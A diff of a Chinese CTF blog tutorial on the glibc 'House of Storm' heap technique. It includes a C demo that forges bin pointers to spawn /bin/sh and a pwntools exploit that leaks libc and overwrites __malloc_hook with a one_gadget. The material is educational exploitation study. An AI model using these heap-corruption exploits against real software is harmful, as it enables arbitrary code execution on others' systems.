@@ -53,7 +53,7 @@
 <p> <img src="/images/%E5%A0%86Pwn%EF%BC%9AHouse%20Of%20Storm%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/2641001-20220925184357857-1278640598.png" alt="img"></p>
  <br>
 
-<h2 id="0x02：Demo示例"><a href="#0x02：Demo示例" class="headerlink" title="0x02：Demo示例"></a>0x02：Demo示例</h2><pre><code class="c">// gcc -ggdb -fpie -pie house_of_storm.c -o house_of_storm
+<h2 id="0x02：Demo示例"><a href="#0x02：Demo示例" class="headerlink" title="0x02：Demo示例"></a>0x02：Demo示例</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">&#x2F;&#x2F; gcc -ggdb -fpie -pie house_of_storm.c -o house_of_storm
 #include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;string.h&gt;
@@ -68,64 +68,64 @@ int main(void)
     unsigned long *fake_chunk;
     char *ptr;
 
-    unsorted_bin=malloc(0x418);
+    unsorted_bin&#x3D;malloc(0x418);
     malloc(0X18);
-    large_bin=malloc(0x408);
+    large_bin&#x3D;malloc(0x408);
     malloc(0x18);
 
     free(large_bin);
     free(unsorted_bin);
-    unsorted_bin=malloc(0x418);
+    unsorted_bin&#x3D;malloc(0x418);
     free(unsorted_bin);
 
-    fake_chunk=((unsigned long)fake.content)-0x10;
-    unsorted_bin[0]=0;
-    unsorted_bin[1]=(unsigned long)fake_chunk;
+    fake_chunk&#x3D;((unsigned long)fake.content)-0x10;
+    unsorted_bin[0]&#x3D;0;
+    unsorted_bin[1]&#x3D;(unsigned long)fake_chunk;
 
-    large_bin[0]=0;
-    large_bin[1]=(unsigned long)fake_chunk+8;
-    large_bin[2]=0;
-    large_bin[3]=(unsigned long)fake_chunk-0x18-5;
+    large_bin[0]&#x3D;0;
+    large_bin[1]&#x3D;(unsigned long)fake_chunk+8;
+    large_bin[2]&#x3D;0;
+    large_bin[3]&#x3D;(unsigned long)fake_chunk-0x18-5;
 
-    ptr=malloc(0x48);
-    strncpy(ptr, &quot;/bin/sh&quot;, 0x48 - 1);
+    ptr&#x3D;malloc(0x48);
+    strncpy(ptr, &quot;&#x2F;bin&#x2F;sh&quot;, 0x48 - 1);
     system(fake.content);
-&#125;
-</code></pre>
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>该代码展示的最终目标是分配chunk到fake_chunk。</p>
 <p>代码16~19行，分配了两个large bin范围的chunk，并隔开。稍大的chunk后面会被调(tiao)到unsorted bin中，稍小的chunk会被free到large bin中。</p>
 <p>代码21~24行，先将两个chunk free到unsorted bin中（头插法，先进先出）。然后malloc稍大的那个chunk使稍小的chunk进入large bin中，最后再次free掉稍大的chunk，使其进入unsorted bin。这样就满足的第三个条件。</p>
 <br>
 
 <p>后面就是对bk和bk_nextsize指针进行操控：</p>
-<pre><code class="C">//代码26 ~ 33
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;代码26 ~ 33
  
-    fake_chunk=((unsigned long)fake.content)-0x10;
-//unsorted_bin-&gt;bk = fake_chunk
-//则fake_chunk-&gt;fd = unsorted_chunks(av),不过似乎没有发挥使用
-//重点是：unsorted_chunks(av)-&gt;bk = fake_chunk
-    unsorted_bin[0]=0;
-    unsorted_bin[1]=(unsigned long)fake_chunk;
+    fake_chunk&#x3D;((unsigned long)fake.content)-0x10;
+&#x2F;&#x2F;unsorted_bin-&gt;bk &#x3D; fake_chunk
+&#x2F;&#x2F;则fake_chunk-&gt;fd &#x3D; unsorted_chunks(av),不过似乎没有发挥使用
+&#x2F;&#x2F;重点是：unsorted_chunks(av)-&gt;bk &#x3D; fake_chunk
+    unsorted_bin[0]&#x3D;0;
+    unsorted_bin[1]&#x3D;(unsigned long)fake_chunk;
 
-    large_bin[0]=0;
-    large_bin[1]=(unsigned long)fake_chunk+8;
-    large_bin[2]=0;
-//(fake_chunk-0x18-5)-&gt;fd_nextsize = victim(a heap_addr)
-//即fake_chunk-0x18-5+0x20 = fake_chunk+3 = victim
-    large_bin[3]=(unsigned long)fake_chunk-0x18-5;
+    large_bin[0]&#x3D;0;
+    large_bin[1]&#x3D;(unsigned long)fake_chunk+8;
+    large_bin[2]&#x3D;0;
+&#x2F;&#x2F;(fake_chunk-0x18-5)-&gt;fd_nextsize &#x3D; victim(a heap_addr)
+&#x2F;&#x2F;即fake_chunk-0x18-5+0x20 &#x3D; fake_chunk+3 &#x3D; victim
+    large_bin[3]&#x3D;(unsigned long)fake_chunk-0x18-5;
 
-/*其实,largebin attack部分这样也可以：
-*    large_bin[0]=0;
-*   large_bin[1]=(unsigned long)fake_chunk-0x8-5;
-*   large_bin[2]=0;
-*   large_bin[3]=(unsigned long)fake_chunk-0x8;
+&#x2F;*其实,largebin attack部分这样也可以：
+*    large_bin[0]&#x3D;0;
+*   large_bin[1]&#x3D;(unsigned long)fake_chunk-0x8-5;
+*   large_bin[2]&#x3D;0;
+*   large_bin[3]&#x3D;(unsigned long)fake_chunk-0x8;
 *因为有两处可以修改任意地址
-*/
-</code></pre>
+*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>malloc(0x48)：申请0x50大小的chunk，chunk中size为0x55/0x56的大小也会被归为0x50这一级别。malloc(0x48)这一过程中，把unsorted_bin脱链，并链接到了large bin中。</p>
 <p><img src="/images/%E5%A0%86Pwn%EF%BC%9AHouse%20Of%20Storm%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/2641001-20220925184818472-631076082.png" alt="img"></p>
 <p> 这里需要size为0x56才能分配chunk成功，0x55是会发生报错的。其原因是因为从<code>_int_malloc</code>返回到<code>_libc_malloc</code>后，还会有个断言对chunk进行检查：</p>
-<pre><code class="c">/*
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">&#x2F;*
     #define arena_for_chunk(ptr) \
         (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)
     
@@ -133,10 +133,10 @@ int main(void)
     1. victim 为 0
     2. IS_MMAPPED 为 1
     3. NON_MAIN_ARENA 为 0
-*/
+*&#x2F;
 assert(!victim || chunk_is_mmapped(mem2chunk(victim)) 
-       || ar_ptr == arena_for_chunk(mem2chunk(victim)));
-</code></pre>
+       || ar_ptr &#x3D;&#x3D; arena_for_chunk(mem2chunk(victim)));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>0x56：0101 0110，满足第二个。</p>
 <p>0x55：0101 0101，不满足，会报错。</p>
 <p>因为系统一般会开ASLR，所以0x56、0x55发生的概率差不多，crash的话，多试几次就好了。</p>
@@ -151,12 +151,12 @@ assert(!victim || chunk_is_mmapped(mem2chunk(victim))
 <p>静态分析程序，delete函数里面存在UAF漏洞，那就可以随便玩了。</p>
 <p>这里使用house of storm手法，应该还有其他方法。</p>
 <p>具体思路就不说了，和上面的示例基本一模一样，这里getshell是通过覆盖malloc_hook为one_gadget。需要注意的是选择fake_chunk位置时，size位不能有数据，要为空。</p>
-<pre><code class="python">from pwn import *
-context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)
 
-io = process(&quot;./simple_storm&quot;)
-#io = remote(&quot;114.67.175.224&quot;, 12327)
-libc = ELF(&quot;./libc-2.23.so&quot;)
+io &#x3D; process(&quot;.&#x2F;simple_storm&quot;)
+#io &#x3D; remote(&quot;114.67.175.224&quot;, 12327)
+libc &#x3D; ELF(&quot;.&#x2F;libc-2.23.so&quot;)
 
 def add(size):
     io.sendlineafter(&quot;Your choice?&quot;, &quot;1&quot;)
@@ -185,32 +185,40 @@ add(0x410) #2
 add(0x18)  #3
 delete(0)
 show(0)
-main_arena = u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;)) - 88
-libc_base = main_arena - 0x3c4b20
-print(&quot;@@@ main_arena = &quot; + str(hex(main_arena)))
-print(&quot;@@@ libc_base = &quot; + str(hex(libc_base)))
+main_arena &#x3D; u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;)) - 88
+libc_base &#x3D; main_arena - 0x3c4b20
+print(&quot;@@@ main_arena &#x3D; &quot; + str(hex(main_arena)))
+print(&quot;@@@ libc_base &#x3D; &quot; + str(hex(libc_base)))
 
 delete(2)
 add(0x410) #4
 delete(4)
 
-ogg = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
-malloc_hook = main_arena - 0x10
-fakechunk = malloc_hook - 0x50
+ogg &#x3D; [0x45226, 0x4527a, 0xf03a4, 0xf1247]
+malloc_hook &#x3D; main_arena - 0x10
+fakechunk &#x3D; malloc_hook - 0x50
 edit(4, p64(0) + p64(fakechunk))
 edit(0, p64(0) + p64(fakechunk + 0x8) + p64(0) + p64(fakechunk-0x18-5))
 add(0x48) #5
 edit(5, p64(ogg[1] + libc_base)*9)
 add(0x20)
-io.interactive()
-</code></pre>
+io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <br>
 
 <h2 id="0x04：参考"><a href="#0x04：参考" class="headerlink" title="0x04：参考"></a>0x04：参考</h2><ol>
 <li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/203096">https://www.anquanke.com/post/id/203096</a></li>
 <li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Rookle/p/13140339.html">https://www.cnblogs.com/Rookle/p/13140339.html</a></li>
 </ol>
-<p class="textAlignRight"><span>↶ </span><a href="/">返回首页</a><span></span></p></div></div></body><script src="/js/highlight.min.js"></script><script src="/js/main.js"></script><script src="/js/bootstrap/bootstrap.min.js"></script><script>window.dataLayer = window.dataLayer || [];
+<p class="textAlignRight"><span>↶ </span><a href="/">返回首页</a><span></span></p></div></div></body><script src="/js/highlight.min.js"></script><script src="/js/main.js"></script><script src="/js/bootstrap/bootstrap.min.js"></script><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script><script async="" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script><script>MathJax = {
+      tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+      },
+      svg: {
+          fontCache: 'global'
+      }
+  };
+</script><script>window.dataLayer = window.dataLayer || [];
 function gtag(){dataLayer.push(arguments);}
 gtag('js', new Date());
 gtag('config', '');</script></html>
